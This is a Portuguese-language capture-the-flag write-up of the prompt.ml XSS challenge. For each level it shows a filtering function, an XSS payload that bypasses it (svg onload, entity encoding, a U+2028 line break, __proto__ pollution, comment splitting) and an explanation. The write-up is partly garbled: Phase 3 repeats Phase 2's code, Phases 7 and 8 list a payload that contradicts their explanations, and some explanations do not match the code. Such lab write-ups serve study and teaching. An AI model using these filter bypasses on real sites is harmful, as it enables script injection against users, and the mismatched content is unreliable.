# Duckware Team - prompt.ml

###### Solved by @0xpics

> This CTF is about JavaScript analysis, xss script

## Sobre o Desafio

prompt.ml é um site no qual o objetivo do usuário é explorar vulnerabilidades de códigos em JavaScript utilizando scripts em xss. São 16 levels, de 0 a E, o usuário concluirá a fase uma vez que o site corretamente receber prompt(1).

## O Desafio

### FASE 0

Este é código dado:

```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}
```

Este código é uma função simples que tem como objetivo criar uma string HTML contendo um elemento de input.

O código é vulnerável a ataques XSS porque:

* Não há nenhuma sanitização ou escape do valor input antes de incluí-lo no HTML

* Um atacante pode injetar código JavaScript malicioso

Para explorarmos essa vulnerabilidade usaremos:

`"><script>prompt(1)</script>`

O payload funciona porque:

1. Fecha o atributo value com `">`, saindo do contexto seguro.

2. Injeta uma tag `<script>`, que o navegador interpreta como código executável.

3. A função não filtra caracteres perigosos `(<, >, ")`, permitindo que o script seja renderizado.

### FASE 1

Este é o código dado:

```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```

A função recebe um input e:

* Remove todas as tags HTML usando uma expressão regular
`(stripTagsRE)`

* Insere o resultado entre tags `<article>`

Para explorarmos essa vulnerabilidade usaremos:

`<svg/onload=prompt(1)`

O payload bypassa a sanitização porque:

1. A regex falha em detectá-lo como tag (devido à sintaxe incomum <svg/...>).

2. O navegador interpreta como:

* Uma tag SVG válida

* O atributo onload (evento nativo)

* Executa prompt(1) automaticamente ao carregar.

### FASE 2

Este é o código dado:

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```
Objetivo da Função:

Remover caracteres específicos `(=` e `()` de uma string de entrada para prevenir possíveis vulnerabilidades.

Para explorarmos essa vulnerabilidade usaremos:

`<svg><script>prompt&#40;1)</script>`

O payload funciona porque:

A função `escape()` não filtra tags `(<svg>`, `<script>)`, já que só remove `=` e `(`.

`&#40;` é decodificado pelo navegador como `(`, contornando a remoção do caractere `(`.

O navegador executa o script dentro de `<svg>` normalmente, mesmo com a codificação.

**Lista para [HTML entities](https://www.freeformatter.com/html-entities.html).**

### FASE 3

Este é o código dado:

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}
```

Objetivo da Função:

Adicionar o input dentro de um comentário HTML `(<!-- ... -->)` para evitar execução de scripts maliciosos, substituindo `->` por `_`.

Para explorarmos essa vulnerabilidade usaremos:

`<!-- --!><svg onload=prompt(1)>`

Por que o script funciona?

1. Fecha o comentário HTML:

* `--!>` encerra o comentário antecipadamente, mesmo dentro de `<!-- ... -->`.

2. Injeção de SVG malicioso:

* O navegador interpreta `<svg onload=prompt(1)>` como HTML válido.

* O evento onload executa `prompt(1)` automaticamente.

3. Falha na sanitização:

* A função só filtra `->`, ignorando `--!>` e tags HTML.

### FASE 4

Infelizmente não foi possível concluir essa fase.

### FASE 5

Este é o código dado:

```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}        
```

Objetivo da função é: tentar prevenir XSS ao:

* Remover caracteres `>`

* Neutralizar event handlers (qualquer atributo que comece com `on`)

* Bloquear especificamente o atributo `focus`

Para explorarmos essa vulnerabilidade usaremos:

`"type=image src onerror
="prompt(1)`

Por que o script funciona?:

1. A função só remove > e handlers como on...=, mas não bloqueia:

* Atributos maliciosos sem > (type=image src onerror=)

* Uso de espaços e quebras de linha

### Fase 6

Este é o código dado:

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}        
```

Esta função recebe um input no formato `URL#JSON` (ex: `http://example.com/post#{"key":"value"}`), cria um formulário HTML com os dados do JSON e os envia automaticamente via POST.

Para explorarmos essa vulnerabilidade usaremos:

`javascript:prompt(1)#{"action":1}`

1. O Código Analisado Tem Duas Partes:

* `javascript:prompt(1)` → URL maliciosa (executa JS).

* `#{"action":1}` → Fragmento JSON (dados do formulário).

2. Falha na Validação da URL:

* A função só verifica se `action` contém `script:` ou `data:`, mas:

* Não bloqueia `javascript:` (porque `:` está codificado como `%3A`).

* Não valida o protocolo real (deveria permitir apenas `http:`/`https:`).

### Fase 7

Este é o código dado:


```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}        
```

Objetivo da Função:

Processa um input no formato texto#texto#texto... e gera parágrafos HTML com os 12 primeiros caracteres de cada segmento como título.

Para explorarmos essa vulnerabilidade usaremos:

`javascript:prompt(1)#{"action":1}`

Por que funciona?:

1. Bypass da Sanitização

A função divide o input por `#` e limita a 12 caracteres, mas não escapa caracteres especiais (`<`, `>`, `"`, `'`).

O payload usa `">` para fechar a tag original e injeta `<svg>` malicioso.

2. Injeção de Tag SVG

`<svg/a=` cria uma tag SVG sem espaços (truque para evitar detecção).

`onload='prompt(1)'` executa JavaScript quando o SVG carrega.

### Fase 8

O codigo dado é:

```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}        
```

A função `escape(input)` tenta sanitizar uma string removendo quebras de linha, aspas e alguns caracteres HTML, e então insere essa string dentro de um comentário em um `<script>` com um `console.log`.

Para explorarmos essa vulnerabilidade usaremos:

`javascript:prompt(1)#{"action":1}`(executar no console)

Essa string funciona porque \u2028 é interpretado como uma quebra de linha em JavaScript, o que encerra um comentário ou string e permite que prompt(1) seja executado.

### Fase 9

O código dado:

```
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}        
```

A função `escape(input)` tenta evitar HTML malicioso ao substituir tags como `<script>` por `<_script>` e converter o texto para maiúsculas dentro de uma tag `<h1>`.

Para explorarmos essa vulnerabilidade usaremos:

`<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>`

1. Essa payload funciona porque usa ofuscação para burlar filtros de segurança:

* `ſvg` (com "ſ" Unicode) é interpretado como `<svg>` por alguns navegadores.

* `onload=&#112;...` é `prompt(1)` codificado como entidades HTML.

* O navegador decodifica e executa: `<svg onload=prompt(1)>`, disparando o XSS.

Lista de [Unicode](https://symbl.cc/en/unicode-table/).

### Fase A

O código dado:

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}        
```

A função tenta codificar e manipular o input para evitar prompt, mas insere o resultado diretamente em um `<script>`

Para explorarmos essa vulnerabilidade usaremos:

`p'rompt(1)`

1. A string `p'rompt(1)` funciona como uma forma de burlar filtros simples que bloqueiam a palavra prompt. Ao inserir um caractere como ' no meio da palavra, o filtro não reconhece a sequência completa e deixa passar. 

### Fase B

O código dado: 

```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}        
```

Esse código define uma função chamada escape(input) com a intenção de limpar um nome de usuário, gerar um objeto JSON e usá-lo em um `<script>`.

Para explorarmos essa vulnerabilidade usaremos:

`"(prompt(1))in"`

A expressão `"(prompt(1))in"` é válida até a chamada de função, e só se torna inválida quando o operador in fica sem um operando à direita. O `prompt(1)` é executado antes da verificação de erro de sintaxe, permitindo execução arbitrária mesmo dentro de expressões quebradas.

### Fase C

O Código dado:

```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}        
```

A função `escape(input)` aplica `encodeURIComponent` ao input, remove aspas simples e substitui a palavra `prompt` por `alert`, e insere o resultado diretamente em uma tag `<script>`.

Para explorarmos essa vulnerabilidade usaremos:

`eval(630038579..toString(30))(1)`

Essa técnica é uma forma de ofuscação e bypass de filtros que bloqueiam diretamente a palavra `"eval"`. Ao representar `"eval"` via conversão de número em base 30, o código pode escapar de proteções simples e ainda executar dinamicamente código malicioso.

### Fase D

```
 function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}        
```

Essa função:

* Analisa um JSON contendo a URL de uma imagem.

* Usa um extend para aplicar configurações padrão.

* Tenta validar a URL com uma regex simplista.

* Gera uma tag <img> substituindo {{source}} diretamente.

Para explorarmos essa vulnerabilidade usaremos:

`{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}`

1. A entrada usa __proto__ para inserir uma propriedade "source" no protótipo de objetos.

2. A função extend() copia isso inadvertidamente.

3. O código então acessa config.source, que resolve para Object.prototype.source.

4. Resultado: a string maliciosa é inserida no HTML e permite XSS via atributo onerror.

### Fase E

Infelizmente não foi possível resolver essa fase

### Fase F

O código dado:

```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}        
```

A função escape(input) recebe um texto no formato texto1#texto2#texto3... e:

1. Remove asteriscos (*) do input.

2. Divide o texto por #, criando segmentos.

3. Gera parágrafos HTML (<p>) para cada segmento, com:

* Um atributo title contendo os 15 primeiros caracteres do segmento (sem sanitização).

* Um atributo data-comment com um JSON seguro ({"id": índice}).

Para explorarmos essa vulnerabilidade usaremos:

`"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>`

Como o Payload Bypassa a Defesa:

1. Primeiro Segmento (`">`):
* Fecha o atributo title original e a tag `<p>`

2. Segmentos Seguintes (`<svg>`, `<!--#-->`, `<script>`, etc.):

* São concatenados como novos elementos HTML, ignorando o limite de 15 caracteres por segmento (pois o `split('#')` divide os comentários `<!--#-->)`.

* O `<!--#-->` é um comentário HTML válido (ignorado pelo navegador).

* O `<script>prompt(1)</script>` é executado normalmente.

## Conclusão

prompt.ml é um ótimo site que oferece problemas desafiadores e ensinana prática diversas vulnerabilidade em JS e como explorá-las. 
